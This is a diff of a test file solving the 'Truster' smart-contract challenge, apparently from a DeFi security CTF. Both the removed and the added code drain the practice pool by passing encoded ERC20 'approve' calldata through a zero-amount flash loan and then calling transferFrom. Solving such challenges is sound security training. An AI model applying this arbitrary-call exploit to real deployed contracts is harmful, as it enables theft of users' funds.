@@ -22,16 +22,14 @@ describe('[Challenge] Truster', function () {
     });
 
     it('Execution', async function () {
+
         // TrusterLenderPool allows caller to run an arbitrary function in any contract on its behalf
         // We can just approve a transfer of all its money to us in the ERC20 token
-        poolPlayer = pool.connect(player);
-        tokenPlayer = token.connect(player);
-        let ABI = ["function approve(address spender, uint256 amount)"];
-        let iface = new ethers.utils.Interface(ABI);
-        function_data = iface.encodeFunctionData("approve", [player.address, TOKENS_IN_POOL]);
-        await poolPlayer.flashLoan(0, player.address, token.address, function_data);
-        expect(await token.allowance(pool.address, player.address)).to.eq(TOKENS_IN_POOL);
-        await tokenPlayer.transferFrom(pool.address, player.address, TOKENS_IN_POOL);
+
+        approveCall = token.interface.encodeFunctionData("approve", [player.address, TOKENS_IN_POOL]);
+        await pool.connect(player).flashLoan(0, player.address, token.address, approveCall);
+        await token.connect(player).transferFrom(pool.address, player.address, TOKENS_IN_POOL);
+        
     });
 
     after(async function () {
